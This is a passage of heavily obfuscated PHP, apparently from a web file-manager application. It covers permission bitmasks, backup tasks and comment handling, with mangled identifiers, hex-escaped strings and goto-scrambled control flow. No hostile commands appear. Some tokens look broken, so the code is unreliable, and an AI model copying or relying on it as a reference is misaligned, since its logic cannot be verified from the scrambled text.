$c¢ĞŞÜ‚Ú = IO_PATH_SYSTEM_TEMP . $E¼ÇòéŒ¦[1632] . KodIO::hashPath($Fâµ·µ¤²) . $E¼ÇòéŒ¦[1633]; $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1634]] = Action($E¼ÇòéŒ¦[1635])->pluginCacheFileSet($c¢ĞŞÜ‚Ú, $d×ñÛ½›Ïñ); unset($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1619]]); } $fÃµ«ÑÉÔ = _get($A–ä‚ËŠ¦Ö, $E¼ÇòéŒ¦[1637], $E¼ÇòéŒ¦[33]); $a—ë‘ñé—ï = _get($A–ä‚ËŠ¦Ö, $E¼ÇòéŒ¦[1638], $E¼ÇòéŒ¦[33]); goto E‰ÉáğæÒ¸; EòÍ‹¼í„: return $A–ä‚ËŠ¦Ö; goto CÅÎáé¨Ï; E‰ÉáğæÒ¸: $AšÖ¤ñ“– = _get($A–ä‚ËŠ¦Ö, $E¼ÇòéŒ¦[1639], $E¼ÇòéŒ¦[33]); $f´¯Ò´Á = $fÃµ«ÑÉÔ . $a—ë‘ñé—ï . $AšÖ¤ñ“–; if ($f´¯Ò´Á && get_charset($f´¯Ò´Á) != $E¼ÇòéŒ¦[326]) { $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1347]] = iconv_to($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1347]], get_charset($f´¯Ò´Á), $E¼ÇòéŒ¦[326]); $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1640]] = iconv_to($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1640]], get_charset($f´¯Ò´Á), $E¼ÇòéŒ¦[326]); $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1641]] = iconv_to($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1636]][$E¼ÇòéŒ¦[1641]], get_charset($f´¯Ò´Á), $E¼ÇòéŒ¦[326]); } goto EòÍ‹¼í„; C°ôÚ×éˆ: $E¼ÇòéŒ¦ =& $_SERVER[¦·]; if (isset($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1627]])) { $F¼£¢ÔæŞ  = ceil($A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1627]]); $Aóˆ‘¸®‡î = intval($F¼£¢ÔæŞ  / 3600); $cÚ“á°Éó = intval(($F¼£¢ÔæŞ  - $Aóˆ‘¸®‡î * 3600) / 60); $fÜ‚İ®¡´Ó = $F¼£¢ÔæŞ  % 60; $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1628]] = sprintf($E¼ÇòéŒ¦[1629], $Aóˆ‘¸®‡î, $cÚ“á°Éó, $fÜ‚İ®¡´Ó); if ($Aóˆ‘¸®‡î == 0) { $A–ä‚ËŠ¦Ö[$E¼ÇòéŒ¦[1628]] = sprintf($E¼ÇòéŒ¦[1630], $cÚ“á°Éó, $fÜ‚İ®¡´Ó); } } $d×ñÛ½›Ïñ = _get($A–ä‚ËŠ¦Ö, $E¼ÇòéŒ¦[1631]); goto C‘óÂ¡¿—´; CÅÎáé¨Ï: } private static function valueReset($bÌÏÛğõ, $eÈ›Ş¸é‹â, $bÈ×¥‚Ğ¾) { $døîƒ½‹® =& $_SERVER[¦·]; $e‡°È±¨¯ = $døîƒ½‹®[1557]; switch ($bÌÏÛğõ) { case $døîƒ½‹®[1642]: $eÈ›Ş¸é‹â = $eÈ›Ş¸é‹â == $døîƒ½‹®[83] ? $døîƒ½‹®[1643] : $døîƒ½‹®[1644]; break; case $døîƒ½‹®[1645]: $eÈ›Ş¸é‹â = $eÈ›Ş¸é‹â ? $eÈ›Ş¸é‹â : null; break; default: break; } switch ($bÈ×¥‚Ğ¾) { case $døîƒ½‹®[1646]: $eÈ›Ş¸é‹â = round($eÈ›Ş¸é‹â, 2); break; case $døîƒ½‹®[187]: case $døîƒ½‹®[107]: if ($eÈ›Ş¸é‹â < 0) { $eÈ›Ş¸é‹â = null; } else { if (is_numeric($eÈ›Ş¸é‹â)) { $eÈ›Ş¸é‹â = date($e‡°È±¨¯, $eÈ›Ş¸é‹â); } } break; default: break; } return $eÈ›Ş¸é‹â; } private static function fileTypeArray() { $B†¹â„é‘Â =& $_SERVER[¦·]; return array($B†¹â„é‘Â[1619] => array($B†¹â„é‘Â[160] => $B†¹â„é‘Â[1647] . $B†¹â„é‘Â[1648], $B†¹â„é‘Â[1623] => array($B†¹â„é‘Â[1540] => $B†¹â„é‘Â[1649], $B†¹â„é‘Â[1542] => $B†¹â„é‘Â[1650], $B†¹â„é‘Â[1651] => $B†¹â„é‘Â[1652], $B†¹â„é‘Â[1653] => $B†¹â„é‘Â[1654], $B†¹â„é‘Â[187] => $B†¹â„é‘Â[1655], $B†¹â„é‘Â[107] => $B†¹â„é‘Â[1656], $B†¹â„é‘Â[1657] => $B†¹â„é‘Â[1658], $B†¹â„é‘Â[1659] => $B†¹â„é‘Â[1660], $B†¹â„é‘Â[1661] => $B†¹â„é‘Â[1662], $B†¹â„é‘Â[1663] => $B†¹â„é‘Â[1664], $B†¹â„é‘Â[1665] => $B†¹â„é‘Â[1666], $B†¹â„é‘Â[1667] => $B†¹â„é‘Â[1668], $B†¹â„é‘Â[1669] => $B†¹â„é‘Â[1670], $B†¹â„é‘Â[1671] => array($B†¹â„é‘Â[1672] => $B†¹â„é‘Â[1673], $B†¹â„é‘Â[1674] => $B†¹â„é‘Â[1675], $B†¹â„é‘Â[1676] => $B†¹â„é‘Â[1677]), $B†¹â„é‘Â[1678] => $B†¹â„é‘Â[1679], $B†¹â„é‘Â[1680] => $B†¹â„é‘Â[1681], $B†¹â„é‘Â[1682] => $B†¹â„é‘Â[1683], $B†¹â„é‘Â[1684] => $B†¹â„é‘Â[1685], $B†¹â„é‘Â[1686] => array($B†¹â„é‘Â[1687] => $B†¹â„é‘Â[1688], $B†¹â„é‘Â[1689] => $B†¹â„é‘Â[1690], $B†¹â„é‘Â[1691] => $B†¹â„é‘Â[1692], $B†¹â„é‘Â[1693] => $B†¹â„é‘Â[1694], $B†¹â„é‘Â[1695] => $B†¹â„é‘Â[1696], $B†¹â„é‘Â[1697] => $B†¹â„é‘Â[1698], $B†¹â„é‘Â[1699] => $B†¹â„é‘Â[1700], $B†¹â„é‘Â[1701] => $B†¹â„é‘Â[1702], $B†¹â„é‘Â[1703] => $B†¹â„é‘Â[1704], $B†¹â„é‘Â[1705] => $B†¹â„é‘Â[1706], $B†¹â„é‘Â[1707] => $B†¹â„é‘Â[1708]))), $B†¹â„é‘Â[1709] => array($B†¹â„é‘Â[160] => $B†¹â„é‘Â[1710] . $B†¹â„é‘Â[1711], $B†¹â„é‘Â[1623] => array($B†¹â„é‘Â[1627] => $B†¹â„é‘Â[1712], $B†¹â„é‘Â[187] => $B†¹â„é‘Â[1713], $B†¹â„é‘Â[107] => $B†¹â„é‘Â[1714], $B†¹â„é‘Â[1659] => $B†¹â„é‘Â[1715], $B†¹â„é‘Â[1716] => $B†¹â„é‘Â[1717], $B†¹â„é‘Â[1718] => $B†¹â„é‘Â[1645], $B†¹â„é‘Â[1719] => $B†¹â„é‘Â[1720], $B†¹â„é‘Â[1721] => $B†¹â„é‘Â[1722], $B†¹â„é‘Â[1723] => $B†¹â„é‘Â[1724], $B†¹â„é‘Â[1636] => array($B†¹â„é‘Â[1347] => $B†¹â„é‘Â[1725], $B†¹â„é‘Â[1640] => $B†¹â„é‘Â[1726], $B†¹â„é‘Â[1641] => $B†¹â„é‘Â[1727], $B†¹â„é‘Â[1728] => $B†¹â„é‘Â[1729], $B†¹â„é‘Â[1730] => $B†¹â„é‘Â[1731], $B†¹â„é‘Â[1732] => $B†¹â„é‘Â[1733], $B†¹â„é‘Â[1619] => $B†¹â„é‘Â[1734]))), $B†¹â„é‘Â[1735] => array($B†¹â„é‘Â[160] => $B†¹â„é‘Â[1736] . $B†¹â„é‘Â[1737], $B†¹â„é‘Â[1623] => array($B†¹â„é‘Â[1540] => $B†¹â„é‘Â[1738], $B†¹â„é‘Â[1542] => $B†¹â„é‘Â[1739], $B†¹â„é‘Â[1627] => $B†¹â„é‘Â[1712], $B†¹â„é‘Â[187] => $B†¹â„é‘Â[1740], $B†¹â„é‘Â[107] => $B†¹â„é‘Â[1741], $B†¹â„é‘Â[1646] => $B†¹â„é‘Â[1742], $B†¹â„é‘Â[1723] => $B†¹â„é‘Â[1743], $B†¹â„é‘Â[1719] => $B†¹â„é‘Â[1744], $B†¹â„é‘Â[1659] => $B†¹â„é‘Â[1745], $B†¹â„é‘Â[1709] => array($B†¹â„é‘Â[1718] => $B†¹â„é‘Â[1645], $B†¹â„é‘Â[1746] => $B†¹â„é‘Â[1747], $B†¹â„é‘Â[1716] => $B†¹â„é‘Â[1717], $B†¹â„é‘Â[1723] => $B†¹â„é‘Â[1724], $B†¹â„é‘Â[1719] => $B†¹â„é‘Â[1748], $B†¹â„é‘Â[1721] => $B†¹â„é‘Â[1722]))), $B†¹â„é‘Â[1749] => array($B†¹â„é‘Â[1623] => array($B†¹â„é‘Â[1750] => $B†¹â„é‘Â[1751], $B†¹â„é‘Â[1752] => $B†¹â„é‘Â[1753])), $B†¹â„é‘Â[1754] => array($B†¹â„é‘Â[1623] => array())); } } goto fà„ºá¢±; a†•œ–õêø: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Eòšğ‡‰ƒ‘ =& $_SERVER[¦·]; $A£¡õÍ¼œò = array(array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2113]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2115], $Eòšğ‡‰ƒ‘[2116] => 6, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2119]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2120], $Eòšğ‡‰ƒ‘[2116] => 1, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2121]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2122], $Eòšğ‡‰ƒ‘[2116] => 2, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2123]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2122], $Eòšğ‡‰ƒ‘[2116] => 3, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2124]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2125], $Eòšğ‡‰ƒ‘[2116] => 4, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_VIEW), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2126]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2127], $Eòšğ‡‰ƒ‘[2116] => 5, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Eòšğ‡‰ƒ‘[386] => LNG($Eòšğ‡‰ƒ‘[2128]), $Eòšğ‡‰ƒ‘[2114] => $Eòšğ‡‰ƒ‘[2129], $Eòšğ‡‰ƒ‘[2116] => 7, $Eòšğ‡‰ƒ‘[2117] => 1, $Eòšğ‡‰ƒ‘[2118] => 0)); return $A£¡õÍ¼œò; } public static function authCheck($aƒ‘îæİå, $dÃåÃÈÒê­) { $aƒ‘îæİå = intval($aƒ‘îæİå); if (_get($GLOBALS, $_SERVER[¦·][459])) { return !0; } if ($aƒ‘îæİå <= 0) { return !1; } if (($aƒ‘îæİå & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aƒ‘îæİå & $dÃåÃÈÒê­); } public static function authCheckShow($AÅçÕğˆ¶ä) { return self::authCheck($AÅçÕğˆ¶ä, self::AUTH_SHOW); } public static function authCheckView($D„Í§ã–ÆÖ) { return self::authCheck($D„Í§ã–ÆÖ, self::AUTH_VIEW); } public static function authCheckDownload($e¿Ú¯Õ´¢ª) { return self::authCheck($e¿Ú¯Õ´¢ª, self::AUTH_DOWNLOAD); } public static function authCheckUpload($EŒ¶âÕ¼˜á) { return self::authCheck($EŒ¶âÕ¼˜á, self::AUTH_UPLOAD); } public static function authCheckEdit($E§ÛÆ…Ì‰Ø) { return self::authCheck($E§ÛÆ…Ì‰Ø, self::AUTH_EDIT); } public static function authCheckRemove($A¼µµÊÛŒ) { return self::authCheck($A¼µµÊÛŒ, self::AUTH_REMOVE); } public static function authCheckShare($E˜‡İ”©×Ù) { return self::authCheck($E˜‡İ”©×Ù, self::AUTH_SHARE); } public static function authCheckComment($a¿÷Ï—‚ƒì) { return self::authCheck($a¿÷Ï—‚ƒì, self::AUTH_COMMENT); } public static function authCheckEvent($E‚¦ƒÌŒë¶) { return self::authCheck($E‚¦ƒÌŒë¶, self::AUTH_EVENT); } public static function authCheckRoot($câƒ‚Ç†) { return self::authCheck($câƒ‚Ç†, self::AUTH_ROOT); } public static function authCheckAction($Cø„Ëµ‘¸ß, $bÖôœëã˜) { goto c¨è‡ˆóö–; d©ËŒ˜œŠ›: if (($Cø„Ëµ‘¸ß & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Cø„Ëµ‘¸ß & $D®ÆîŞÎŒ˜); goto aèÄ¢­ƒ´Á; c¨è‡ˆóö–: $F‡ßÃ¡„«Õ =& $_SERVER[¦·]; $d¯¯”•›™† = array($F‡ßÃ¡„«Õ[2130] => self::AUTH_VIEW, $F‡ßÃ¡„«Õ[1043] => self::AUTH_DOWNLOAD, $F‡ßÃ¡„«Õ[103] => self::AUTH_UPLOAD, $F‡ßÃ¡„«Õ[2079] => self::AUTH_EDIT, $F‡ßÃ¡„«Õ[2078] => self::AUTH_REMOVE, $F‡ßÃ¡„«Õ[2089] => self::AUTH_SHARE, $F‡ßÃ¡„«Õ[341] => self::AUTH_COMMENT, $F‡ßÃ¡„«Õ[1429] => self::AUTH_EVENT, $F‡ßÃ¡„«Õ[1567] => self::AUTH_ROOT); if (!isset($d¯¯”•›™†[$bÖôœëã˜])) { return; } goto b“‹‡ªì½š; b“‹‡ªì½š: $D®ÆîŞÎŒ˜ = $d¯¯”•›™†[$bÖôœëã˜]; $Cø„Ëµ‘¸ß = intval($Cø„Ëµ‘¸ß); if ($Cø„Ëµ‘¸ß <= 0) { return !1; } goto d©ËŒ˜œŠ›; aèÄ¢­ƒ´Á: } public static function authDisable($A³¶÷¥„‰ë, $fé‡»œƒè) { if (intval($A³¶÷¥„‰ë) <= 0) { return 0; } return intval($A³¶÷¥„‰ë) & ~$fé‡»œƒè; } public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x73\x6f\x75\162\x63\x65\101\165\x74\x68\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\150", "\154\x61\x62\145\x6c", "\144\x69\163\x70\154\x61\171", "\x73\x79\x73\x74\x65\155", "\x73\157\x72\x74"); public function initData() { $aãÒÀË£Œ“ = $this->authDefault(); foreach ($aãÒÀË£Œ“ as $eÎˆ×…­¾Í) { $this->add($eÎˆ×…­¾Í); } } public function listData($DøŠ¦¼ÙÚ¥ = false, $CÏ‘¥õ åİ = "\x73\157\x72\x74", $d£ŞÎ‘½³Ë = false) { return parent::listData($DøŠ¦¼ÙÚ¥, $CÏ‘¥õ åİ, $d£ŞÎ‘½³Ë); } public function update($D’²õÜäğ, $E»ğŞŒÀÊ›) { $c‘ÓÑŞƒîó =& $_SERVER[¦·]; $e´÷³å¡ØÚ = parent::listData($D’²õÜäğ); $AÂÈŒ¼Ë³ğ = $this->findByName($E»ğŞŒÀÊ›[$c‘ÓÑŞƒîó[28]]); if (!$e´÷³å¡ØÚ || $AÂÈŒ¼Ë³ğ && $AÂÈŒ¼Ë³ğ[$c‘ÓÑŞƒîó[367]] != $e´÷³å¡ØÚ[$c‘ÓÑŞƒîó[367]]) { return !1; } $this->filterAuth($E»ğŞŒÀÊ›[$c‘ÓÑŞƒîó[376]]); return parent::update($D’²õÜäğ, $E»ğŞŒÀÊ›); } public function remove($cˆ¥Œ†Š¦¦) { $b¿Ë¼¼¡Â = parent::listData($cˆ¥Œ†Š¦¦); if (!$b¿Ë¼¼¡Â || $b¿Ë¼¼¡Â[$_SERVER[¦·][1083]]) { return !1; } return parent::remove($cˆ¥Œ†Š¦¦); } public function add($cĞ¬§Ì…¡ = array()) { goto AÌğÇã×™; AÌğÇã×™: $f¦‹Èå“‹Ë =& $_SERVER[¦·]; if ($this->findByName($cĞ¬§Ì…¡[$f¦‹Èå“‹Ë[28]])) { return !1; } $D¹–Ò¾‰º = array($f¦‹Èå“‹Ë[28] => $f¦‹Èå“‹Ë[33], $f¦‹Èå“‹Ë[376] => 1, $f¦‹Èå“‹Ë[2131] => $f¦‹Èå“‹Ë[2132], $f¦‹Èå“‹Ë[2133] => 1, $f¦‹Èå“‹Ë[1083] => 0, $f¦‹Èå“‹Ë[2134] => 0); goto BÅ„«ñÎŒ¡; BÅ„«ñÎŒ¡: $cĞ¬§Ì…¡ = array_merge($D¹–Ò¾‰º, $cĞ¬§Ì…¡); $cĞ¬§Ì…¡[$f¦‹Èå“‹Ë[2134]] = $this->getSort(); $this->filterAuth($cĞ¬§Ì…¡[$f¦‹Èå“‹Ë[376]]); goto CâÄ¼œÊÂ¢; CâÄ¼œÊÂ¢: return parent::insert($cĞ¬§Ì…¡); goto aé¬õ¾µ‡–; aé¬õ¾µ‡–: } private function getSort() { $CÁ›èøÕ†¹ =& $_SERVER[¦·]; $c—È¾İœà = parent::listData(); $b¼ùîäƒ„ = array_to_keyvalue($c—È¾İœà, $CÁ›èøÕ†¹[33], $CÁ›èøÕ†¹[2134]); return empty($b¼ùîäƒ„) ? 0 : max($b¼ùîäƒ„) + 1; } private function filterAuth(&$EîœÁ‘‰£ø) { goto fÌ–Ş¸²¯; eîÇöÚÏíÌ: foreach ($a„Ã¿Çœ ƒ as $f‘ÄÈù¹Ğª) { if ($EîœÁ‘‰£ø & $f‘ÄÈù¹Ğª) { $c¸„¶’Ÿ‰ê[] = $f‘ÄÈù¹Ğª; } } if (in_array(self::AUTH_ROOT, $c¸„¶’Ÿ‰ê)) { $EîœÁ‘‰£ø = array_sum($a„Ã¿Çœ ƒ); return; } $BÔ÷ªğİÌ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto b½ˆ²ÀÙ•Ó; fÌ–Ş¸²¯: if (!$EîœÁ‘‰£ø) { return; } $a„Ã¿Çœ ƒ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c¸„¶’Ÿ‰ê = array(); goto eîÇöÚÏíÌ; b½ˆ²ÀÙ•Ó: foreach ($c¸„¶’Ÿ‰ê as $f‘ÄÈù¹Ğª) { if (isset($BÔ÷ªğİÌ[$f‘ÄÈù¹Ğª])) { $c¸„¶’Ÿ‰ê = array_merge($c¸„¶’Ÿ‰ê, $BÔ÷ªğİÌ[$f‘ÄÈù¹Ğª]); } } $c¸„¶’Ÿ‰ê[] = self::AUTH_SHOW; $EîœÁ‘‰£ø = array_sum(array_unique($c¸„¶’Ÿ‰ê)); goto Báçö¥©ÉÍ; Báçö¥©ÉÍ: } public function sort($a†Ê‚ŒÏøğ, $bê§Ü®Î’) { return parent::update($a†Ê‚ŒÏøğ, $bê§Ü®Î’); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x62\141\x63\153\165\x70\x4c\x69\163\164"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\163\164\x61\x74\x75\x73", "\143\x6f\156\x74\145\x6e\164", "\162\x65\x73\165\x6c\x74", "\x74\x69\155\x65\106\162\157\155", "\x74\151\x6d\145\x54\157"); public function config() { goto bª·ùõ‡Ù; BÆìêÀ¶Š÷: if (isset($bÚ’ĞÚ¿¹[$B–È«êÎË¢[190]])) { $bÚ’ĞÚ¿¹[$B–È«êÎË¢[190]] = json_decode($bÚ’ĞÚ¿¹[$B–È«êÎË¢[190]], !0); } if (isset($A¯ÅĞ†â˜ë[$B–È«êÎË¢[190]])) { $bÚ’ĞÚ¿¹[$B–È«êÎË¢[190]][$B–È«êÎË¢[1416]] = $A¯ÅĞ†â˜ë[$B–È«êÎË¢[190]]; unset($A¯ÅĞ†â˜ë[$B–È«êÎË¢[190]]); } return array_merge($bÚ’ĞÚ¿¹, $A¯ÅĞ†â˜ë); goto AÚÌäØÁˆ; b‡ùœß–ß„: $A¯ÅĞ†â˜ë = is_array($A¯ÅĞ†â˜ë) ? $A¯ÅĞ†â˜ë : array(); if (!isset($A¯ÅĞ†â˜ë[$B–È«êÎË¢[693]])) { $A¯ÅĞ†â˜ë[$B–È«êÎË¢[693]] = $B–È«êÎË¢[83]; } $bÚ’ĞÚ¿¹ = array(); goto bãË‡ª¡™; bãË‡ª¡™: Action($B–È«êÎË¢[2135])->taskInit(); $Cœà…÷Î¾÷ = Model($B–È«êÎË¢[2136])->listData(); foreach ($Cœà…÷Î¾÷ as $fùÁÛ»µİŠ) { if ($fùÁÛ»µİŠ[$B–È«êÎË¢[1083]] == $B–È«êÎË¢[83] && $fùÁÛ»µİŠ[$B–È«êÎË¢[1429]] == $B–È«êÎË¢[2137]) { $bÚ’ĞÚ¿¹ = $fùÁÛ»µİŠ; break; } } goto BÆìêÀ¶Š÷; bª·ùõ‡Ù: $B–È«êÎË¢ =& $_SERVER[¦·]; $A¯ÅĞ†â˜ë = Model($B–È«êÎË¢[1091])->get($B–È«êÎË¢[714]); $A¯ÅĞ†â˜ë = json_decode($A¯ÅĞ†â˜ë, !0); goto b‡ùœß–ß„; AÚÌäØÁˆ: } public function listData($dÂ©ç“„ÇÆ = false, $Eµ‘ß¸ç« = "\x6d\157\144\x69\146\171\x54\151\155\x65", $eÆ—Ç‡Š‚Ù = false) { return parent::listData($dÂ©ç“„ÇÆ, $Eµ‘ß¸ç«, !0); } public function lastItem() { $b”ìõé ‹ = $this->listData(); return !empty($b”ìõé ‹[0]) ? $b”ìõé ‹[0] : null; } public function kill($aƒğº–—ˆƒ) { goto dœ¸ÕÜ…‡Ü; D‚çÇ´†¬Ş: Task::kill($f‚Ú§«Õ¯[713]); Task::kill($f‚Ú§«Õ¯[729]); Task::kill($f‚Ú§«Õ¯[737]); goto D–™Ô´áƒ; dœ¸ÕÜ…‡Ü: $f‚Ú§«Õ¯ =& $_SERVER[¦·]; $Fë¢‡‘è»Í = $this->listData($aƒğº–—ˆƒ); if (!$Fë¢‡‘è»Í || empty($Fë¢‡‘è»Í[$f‚Ú§«Õ¯[28]])) { return !0; } goto D‚çÇ´†¬Ş; D–™Ô´áƒ: $f´Õá¨®”Ö = $Fë¢‡‘è»Í[$f‚Ú§«Õ¯[28]]; $E¿Ë‘®Ø÷ = TEMP_FILES . $f‚Ú§«Õ¯[710] . $f´Õá¨®”Ö . $f‚Ú§«Õ¯[8]; IO::remove($E¿Ë‘®Ø÷, !1); goto DÔÃÓÒÚ»¢; DÔÃÓÒÚ»¢: return $this->remove($aƒğº–—ˆƒ); goto Eà‚‘İ³†‚; Eà‚‘İ³†‚: } public function remove($d¡âÆÁÕñµ) { $Fİ†ŠêÌº = $this->listData($d¡âÆÁÕñµ); if (!$Fİ†ŠêÌº) { return !0; } return $this->backupRemove($Fİ†ŠêÌº); } private function backupRemove($dÎ×¤ˆ¤Û) { $E‹ŠÃ·îÍ =& $_SERVER[¦·]; parent::remove($dÎ×¤ˆ¤Û[$E‹ŠÃ·îÍ[367]]); $a¼ä÷ÊˆÀ = "\173\151\x6f\72{$dÎ×¤ˆ¤Û[$E‹ŠÃ·îÍ[692]]}\x7d\x2f\x64\141\164\x61\142\141\163\145\x2f\142\x61\143\x6b\x75\160\137" . $dÎ×¤ˆ¤Û[$E‹ŠÃ·îÍ[28]]; IO::remove($a¼ä÷ÊˆÀ, !1); return !0; } public function start() { goto c­ËˆÆŠÂ; dÊ¢»‡ã®­: return !0; goto F˜†çÉ±¡¿; c°ğÏ¢Ÿ: if (!$fØÂ‡‡¥æ || $fØÂ‡‡¥æ[$D¬Ïš‰ÅõÅ[1413]] != $D¬Ïš‰ÅõÅ[83]) { return !1; } $BßÆÜäŠ÷¢ = $this->process(); foreach ($BßÆÜäŠ÷¢ as $ağ¦íº‰Áè) { if ($ağ¦íº‰Áè) { return Task::restart($ağ¦íº‰Áè[$D¬Ïš‰ÅõÅ[367]]); } } goto dÓ „ñä½Á; E®İ‚†ÜØÖ: if (!$dôëº£É†¼->dbFile()) { return !1; } if ($fØÂ‡‡¥æ[$D¬Ïš‰ÅõÅ[693]] == $D¬Ïš‰ÅõÅ[470]) { $dôëº£É†¼->file(); } Backup::set(array($D¬Ïš‰ÅõÅ[690] => 1, $D¬Ïš‰ÅõÅ[449] => time())); goto dÊ¢»‡ã®­; c­ËˆÆŠÂ: $D¬Ïš‰ÅõÅ =& $_SERVER[¦·]; if ($GLOBALS[$D¬Ïš‰ÅõÅ[6]][$D¬Ïš‰ÅõÅ[84]][$D¬Ïš‰ÅõÅ[2138]] != $D¬Ïš‰ÅõÅ[83]) { return !0; } $fØÂ‡‡¥æ = $this->config(); goto c°ğÏ¢Ÿ; dÓ „ñä½Á: $dôëº£É†¼ = new Backup(); $dôëº£É†¼->keep(); if (!$dôëº£É†¼->db()) { return !1; } goto E®İ‚†ÜØÖ; F˜†çÉ±¡¿: } public function process() { $C…¡÷É‹ñ =& $_SERVER[¦·]; return array($C…¡÷É‹ñ[695] => Task::get($C…¡÷É‹ñ[713]), $C…¡÷É‹ñ[698] => Task::get($C…¡÷É‹ñ[729]), $C…¡÷É‹ñ[167] => Task::get($C…¡÷É‹ñ[737])); } public function restore() { $DÆë¬¿¬¶Ğ =& $_SERVER[¦·]; ActionCall($DÆë¬¿¬¶Ğ[976], !0, 1); ActionCall($DÆë¬¿¬¶Ğ[976], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\x65\156\x74"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\155\145" => "\143\157\x6d\155\145\156\x74\x5f\x6d\145\164\x61", "\x6d\145\x74\141\106\x69\x65\x6c\144" => "\x63\157\x6d\155\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($C›”ôßóœŠ) { $BÃá±ŸÙ»± =& $_SERVER[¦·]; if ($C›”ôßóœŠ[$BÃá±ŸÙ»±[2139]]) { $E¯¶ê¿à‡ = $this->where(array($BÃá±ŸÙ»±[2140] => $C›”ôßóœŠ[$BÃá±ŸÙ»±[2139]]))->find(); if (!$E¯¶ê¿à‡ || $E¯¶ê¿à‡[$BÃá±ŸÙ»±[371]] != $C›”ôßóœŠ[$BÃá±ŸÙ»±[371]] || $E¯¶ê¿à‡[$BÃá±ŸÙ»±[458]] != $C›”ôßóœŠ[$BÃá±ŸÙ»±[458]]) { return !1; } $this->where(array($BÃá±ŸÙ»±[2140] => 